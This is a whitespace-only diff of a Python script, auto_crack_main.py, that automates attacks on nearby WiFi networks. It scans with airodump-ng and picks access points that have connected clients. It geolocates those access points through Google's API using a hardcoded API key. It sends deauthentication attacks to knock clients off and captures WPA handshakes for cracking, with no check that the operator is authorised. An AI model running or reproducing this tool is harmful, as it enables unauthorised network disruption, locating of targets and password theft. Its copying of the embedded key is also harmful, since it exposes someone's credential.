@@ -62,27 +62,27 @@ cracked_dir = 'home/odroid/cracked/'
 #parse command line arguments here
 def parse_args(argv):
 	ignore = ''
-   	_tidy = 'y'
-   	secs = 30
-   	per = False
-   	try:
-   		opts, args = getopt.getopt(argv,"hi:t:s:p",["ignore=","_tidy=","secs="])
-   	except getopt.GetoptError:
-     	print 'auto_crack_main.py -i <"ignore APs list"> -t <delete working files automatically "y" or "n"> -s <"seconds">'
-      	sys.exit(2)
-   	for opt, arg in opts:
-    	if opt == '-h':
-        	print 'auto_crack_main.py -i <"ignore APs list"> -t <(tidy) "y" or "n"> -s <"seconds to refresh scan file. \
-        	Faster = less chance of a suitable AP being discovered. Default=20secs.">'
-        	sys.exit()
-    	elif opt in ("-i", "--ignore"):
-         	ignore = arg
-      	elif opt in ("-t", "--tidy"):
-         	_tidy = arg
-      	elif opt in ("-s", "--secs"):
-         	secs = arg
-        elif opt == '-p':
-        	per = True	   
+	_tidy = 'y'
+	secs = 30
+	per = False
+	try:
+		opts, args = getopt.getopt(argv,"hi:t:s:p",["ignore=","_tidy=","secs="])
+	except getopt.GetoptError:
+		print 'auto_crack_main.py -i <"ignore APs list"> -t <delete working files automatically "y" or "n"> -s <"seconds">'
+		sys.exit(2)
+	for opt, arg in opts:
+		if opt == '-h':
+			print 'auto_crack_main.py -i <"ignore APs list"> -t <(tidy) "y" or "n"> -s <"seconds to refresh scan file. \
+			Faster = less chance of a suitable AP being discovered. Default=20secs.">'
+			sys.exit()
+		elif opt in ("-i", "--ignore"):
+			ignore = arg
+		elif opt in ("-t", "--tidy"):
+			_tidy = arg
+		elif opt in ("-s", "--secs"):
+			secs = arg
+		elif opt == '-p':
+			per = True     
 
    return ignore, _tidy, secs, per
 
@@ -95,28 +95,28 @@ class MyHandler(PatternMatchingEventHandler):
 
 ##This needs to be improved to tolerate empty/bad xmls...
 	def process(self, event):
-		#print "Path =", event.src_path					#debug
-		#print event.src_path, event.event_type			#debug
+		#print "Path =", event.src_path                 #debug
+		#print event.src_path, event.event_type         #debug
 		time.sleep(0.1)
 		w_xml = xml_machine('%s' % event.src_path)
 		crackable_list = w_xml.crackables()
-		#print "crackable_list:", crackable_list		#debug
+		#print "crackable_list:", crackable_list        #debug
 		if crackable_list == '0':
 			print "no luck buddy, keep trying"
 		else:
 			print "Potential target WIFI AP(s) detected..."
 			geo_list = []
 			for cracker in crackable_list:
-				#print "cracker:", cracker 				#debug
+				#print "cracker:", cracker              #debug
 				w_xml.parse_deets(cracker)
 				#print "BSSD!!!!!!!", w_xml.bssid
 				geo_list.append(w_xml.bssid)
-				#print "GEO_LIST:", geo_list    		#debug
+				#print "GEO_LIST:", geo_list            #debug
 #create/check list of APs that have already been cracked/timed-out and also add any manual exceptions
 #manual exceptions should be able to be cmd line variables
 				ignore_aps = create_ignore_list()
 				if w_xml.name != 'none':
-					if w_xml.name not in ignore_aps: 	##ignore this AP
+					if w_xml.name not in ignore_aps:    ##ignore this AP
 						if w_xml.client_count != 0:
 							#geo_locate Wifi AP of interest
 							#first, get another close WIFI AP
@@ -130,7 +130,7 @@ class MyHandler(PatternMatchingEventHandler):
 								location_data = buildJson(w_xml.bssid, w_xml.power, w_xml.snr, closest_AP, 0, 0)
 								print"LOCATION DATA", location_data
 								lat, lng, acc = geolocate(location_data)
-								#lat, lng, acc = geo_locate(w_xml.bssid, "0", "0")	#power and snr to be added in future.....
+								#lat, lng, acc = geo_locate(w_xml.bssid, "0", "0")  #power and snr to be added in future.....
 								#print 'lat:', lat
 								#print 'lng:', lng
 								#print 'acc:', acc
@@ -140,7 +140,7 @@ class MyHandler(PatternMatchingEventHandler):
 							w_xml.xml_tree()
 							w_xml.xml_write(target_dir+cracker+'.xml')
 						else:
-							print "No suitable WIFI AP(s) detected, continuing to scan..."	
+							print "No suitable WIFI AP(s) detected, continuing to scan..."  
 
 	def on_modified(self, event):
 		#print "modified observer =", observer
@@ -150,7 +150,7 @@ class MyHandler(PatternMatchingEventHandler):
 			self.process(event)
 
 def tidy():
-#Housekeeping function to remove old files	
+#Housekeeping function to remove old files  
 	#check that command line arguments hasnt disabled tidy function (for dev/testing)
 	if (tidy_arg != 'n'):
 		print "Housekeeping..."
@@ -166,7 +166,7 @@ def tidy():
 #test for "self.cracked == False"
 			remove_xml = xml_machine(target_dir+file)
 			remove_xml.parse_deets()
-			#print "remove_xml.cracked:", remove_xml.cracked    			#debug
+			#print "remove_xml.cracked:", remove_xml.cracked                #debug
 			if str(remove_xml.cracked) == 'False':
 				try:
 					print "Removing target xml file:", (target_dir+file)
@@ -191,15 +191,15 @@ def sort_by_power(location):
 #looks at folder of xmls and sorts APs based on "last_max_signal" RF power value
 	sort_dict = {}
 	for sort_me in glob.iglob(location):
-		#print "file:", sort_me						#debug
+		#print "file:", sort_me                     #debug
 		sorted_xml = xml_machine(sort_me)
 		sorted_xml.parse_deets()
-		#print "name:", sorted_xml.name  			#debug
+		#print "name:", sorted_xml.name             #debug
 		#print "power:", sorted_xml.power
 		sort_dict[sorted_xml.name] = str(sorted_xml.power)
-		#print "sort_dict:", sort_dict				#debug
+		#print "sort_dict:", sort_dict              #debug
 	_sorted = sorted(sort_dict.items(), key=operator.itemgetter(1))
-	#print "sorted result:", _sorted				#debug
+	#print "sorted result:", _sorted                #debug
 	return _sorted
 
 def create_ignore_list():
@@ -209,21 +209,21 @@ def create_ignore_list():
 		ignore_xml.parse_deets()
 		if str(ignore_xml.cracked) != 'False':
 			ignore_list.append(ignore_xml.name)
-	print "ignore_list:", ignore_list		
+	print "ignore_list:", ignore_list       
 	return ignore_list
 
 #uses googles geo-location API
 def geo_locate(bssid, strength, ratio):
-	key = 'AIzaSyACZk1FXBvka4ra3DxGg0OYHfPvDTe9Ma0' 	#unique googlemaps api key
+	key = 'AIzaSyACZk1FXBvka4ra3DxGg0OYHfPvDTe9Ma0'     #unique googlemaps api key
 	url = ('https://www.googleapis.com/geolocation/v1/geolocate?key='+key)
 	#print "url:", url
 	location_data = {}
 	location_data = {'considerIP' : 'false',
 			'wifiAccessPoints' :[
 			{"macAddress": bssid,"signalStrength": strength,"signalToNoiseRatio": ratio},
-    		]
-  			}
-  	json_data = json.dumps(location_data)
+			]
+			}
+	json_data = json.dumps(location_data)
 	location_result = json.loads((requests.post(url, data=json_data)).text)
 	loc = location_result['location']
 	accuracy = location_result['accuracy']
@@ -237,22 +237,22 @@ if __name__ == '__main__':
 			tidy()
 			#print "Creating general scanner object"
 			g_scanner = scanner(iface)
-			#print "g_scanner:", g_scanner					#debug
-			#print "Creating pipe for general scan"			#Pipes for control of external application processes
+			#print "g_scanner:", g_scanner                  #debug
+			#print "Creating pipe for general scan"         #Pipes for control of external application processes
 			airodump_parent_conn, airodump_child_conn = Pipe()
 			#print "Creating process for general scan"
 			airodump = Process(target=g_scanner.scan, kwargs={
 			'out_format':'netxml', 
 			'out_dest':output_dir, 
 			'conn':airodump_child_conn,
-			'interval': secs_arg})								#This interval should be configurable by cmd line variable
+			'interval': secs_arg})                              #This interval should be configurable by cmd line variable
 			#print  "Creating process for folder watch"
-			observer = Observer()							#folder watchdog process to monitor outputxml from airodump-ng
+			observer = Observer()                           #folder watchdog process to monitor outputxml from airodump-ng
 			observer.schedule(MyHandler(), path=output_dir)
 			airodump.start()
 			scanning = True
 			time_started = time.time()
-			#print "time_started:%.0f" % time_started			#debug
+			#print "time_started:%.0f" % time_started           #debug
 			print colored("Starting folder watchdog...", 'green')
 			observer.start()
 			while scanning == True:
@@ -261,7 +261,7 @@ if __name__ == '__main__':
 				print "General scan now running for: %.0f seconds" % (time.time() - time_started)
 				file_list = os.listdir(target_dir)
 				if time.time() - time_started >= 9999:
-					print "Times up, aborting general scan..."	
+					print "Times up, aborting general scan..."  
 					scanning = False
 				if file_list != []:
 #test for APs that havent previously been cracked/timed-out
@@ -271,8 +271,8 @@ if __name__ == '__main__':
 						if str(_xml.cracked) == 'False':
 							print colored("Targets detected, aborting general scan...", 'green')
 							scanning = False
-							break	   
-			observer.stop()		
+							break      
+			observer.stop()     
 			airodump_parent_conn.send(scanning)
 			airodump_parent_conn.close()
 			if file_list != []:
@@ -284,14 +284,14 @@ if __name__ == '__main__':
 				scan_list = [x for x in sort_list if x not in ignore_aps]
 				print "Suitable Wifi APs for handshake detection:", scan_list
 				for AP in scan_list:
-					#print "target_dir+file:", (target_dir+file) 		#debug
+					#print "target_dir+file:", (target_dir+file)        #debug
 					f_xml = xml_machine(target_dir+AP[0]+".xml")
-					f_xml.parse_deets()		
-					if str(f_xml.cracked) == "False":					#Test if AP has already been cracked	
+					f_xml.parse_deets()     
+					if str(f_xml.cracked) == "False":                   #Test if AP has already been cracked    
 #start airodump-ng focussed attack using deets parsed from xml
 						print colored("Creating focussed scanner object:", 'green'), colored(f_xml.name, 'green')
 						f_scanner = scanner(iface)
-						#print "f_scanner:", f_scanner					#debug
+						#print "f_scanner:", f_scanner                  #debug
 						f_airodump_parent_conn, f_airodump_child_conn = Pipe()
 						deauth_parent_conn, deauth_child_conn = Pipe()
 						f_airodump = Process(target=f_scanner.scan, kwargs={ 
@@ -303,7 +303,7 @@ if __name__ == '__main__':
 						f_deauth = Process(target=f_scanner.deauth, kwargs={ 
 						'essid':f_xml.name,
 						'bssid':f_xml.bssid,
-						'client_MAC':(f_xml.client_list),	#expects a list
+						'client_MAC':(f_xml.client_list),   #expects a list
 						'conn':deauth_child_conn})
 #start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
 						f_scanner.set_channel(f_xml.channel)
@@ -323,7 +323,7 @@ if __name__ == '__main__':
 								files_handshake = os.listdir(handshake_dir)
 								#print colored("DEBUG: files in HS folder:", 'red')   #debug
 								#print colored(files_handshake, 'red')                #debug
-								for files in files_handshake:		
+								for files in files_handshake:       
 #scan pcap file for valid handshake EAPOL packets
 									handshake_file = (handshake_dir+files)
 									if (handshake_dir+f_xml.name+"_scan") in handshake_file:
@@ -337,18 +337,18 @@ if __name__ == '__main__':
 										print colored("Analysis (pyrit) result of handshake capture:", 'red')
 										print colored(valid.analyze_result, 'red')
 										handshake_count = (handshake_count+1)
-#when handshake detected stop focussed attack			
-										if valid.validation_result or valid.analyze_result == True:			
+#when handshake detected stop focussed attack           
+										if valid.validation_result or valid.analyze_result == True:         
 											print colored("Handshake captured, my job here is done...", 'cyan', 'on_magenta') 
 											f_xml.cracked = 'True'
 											f_xml.xml_tree()
-											f_xml.xml_write(target_dir+f_xml.name+'.xml')	
+											f_xml.xml_write(target_dir+f_xml.name+'.xml')   
 											f_scanning = False
 											f_airodump_parent_conn.send(f_scanning)
 											deauth_parent_conn.send(f_scanning)
 											f_airodump_parent_conn.close()
 											deauth_parent_conn.close()
-											time.sleep(1)											
+											time.sleep(1)                                           
 											os.rename(valid.capfile, (handshake_dir+valid.SSID+'_GOOD.cap'))   #untested
 											#
 											#strip pcap file here if you have to...
@@ -379,7 +379,7 @@ if __name__ == '__main__':
 														except OSError:
 															pass
 #time-out in case no handshakes are captured
-##make this option (length in seconds) controllable via args???			
+##make this option (length in seconds) controllable via args???         
 							if f_scanning == True:
 								print "Focussed attack now running for: %.0f seconds" % (time.time() - time_started)
 								if time.time() - time_started >= 30:
@@ -387,19 +387,19 @@ if __name__ == '__main__':
 									f_xml.cracked = 'Timeout'
 									#print "testing here:", f_xml.cracked        #debug
 									f_xml.xml_tree()
-									f_xml.xml_write(target_dir+f_xml.name+'.xml')	
+									f_xml.xml_write(target_dir+f_xml.name+'.xml')   
 									f_scanning = False
 									f_airodump_parent_conn.send(f_scanning)
 									deauth_parent_conn.send(f_scanning)
 									f_airodump_parent_conn.close()
 									deauth_parent_conn.close()
-									break	
+									break   
 					else:
-						print "Ignoring cracked/timeout AP:", f_xml.name						
+						print "Ignoring cracked/timeout AP:", f_xml.name                        
 			else:
 				print "No suitable networks detected."
 			time.sleep(2)
-			print "up to here..."	
+			print "up to here..."   
 	except KeyboardInterrupt:
 		print "manually interrupted!"
 		tidy()
